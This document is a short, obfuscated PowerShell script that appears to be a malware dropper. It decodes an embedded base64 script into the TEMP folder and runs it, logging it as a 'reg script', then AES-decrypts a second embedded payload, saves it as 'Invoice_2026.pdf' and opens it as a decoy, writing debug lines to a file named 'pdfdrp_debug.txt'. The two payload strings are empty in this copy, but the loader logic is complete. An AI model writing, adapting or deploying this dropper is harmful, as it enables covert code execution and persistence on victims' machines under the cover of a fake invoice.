$ErrorActionPreference='Continue'
try{
$tjrkdp=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$jlvgow="$env:TEMP\nopzkjmc.ps1"
[IO.File]::WriteAllText($jlvgow,$tjrkdp,[Text.Encoding]::UTF8)
"[step1] reg script written to $jlvgow" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $jlvgow
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$ymhrph=[Convert]::FromBase64String('AZDa3Iw3pb92e7QVlvIH/wVm8ada+FEeCUV1f+aMSYQ=')
$azhpgi=[Convert]::FromBase64String('uSakAicixhA5HsnUd4z2RA==')
$jrrqyd=[Convert]::FromBase64String('')
$tbbcig=New-Object Security.Cryptography.AesManaged
$tbbcig.Key=$ymhrph;$tbbcig.IV=$azhpgi;$tbbcig.Mode='CBC';$tbbcig.Padding='PKCS7'
$ivggtk=$tbbcig.CreateDecryptor()
$nkmgna=New-Object IO.MemoryStream(,$jrrqyd)
$sdoecz=New-Object Security.Cryptography.CryptoStream($nkmgna,$ivggtk,[Security.Cryptography.CryptoStreamMode]::Read)
$tpvrfu=New-Object IO.MemoryStream
$sdoecz.CopyTo($tpvrfu);$tbbcig.Dispose()
$aitoow="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($aitoow,$tpvrfu.ToArray())
"[step2] PDF written to $aitoow" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process $aitoow
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
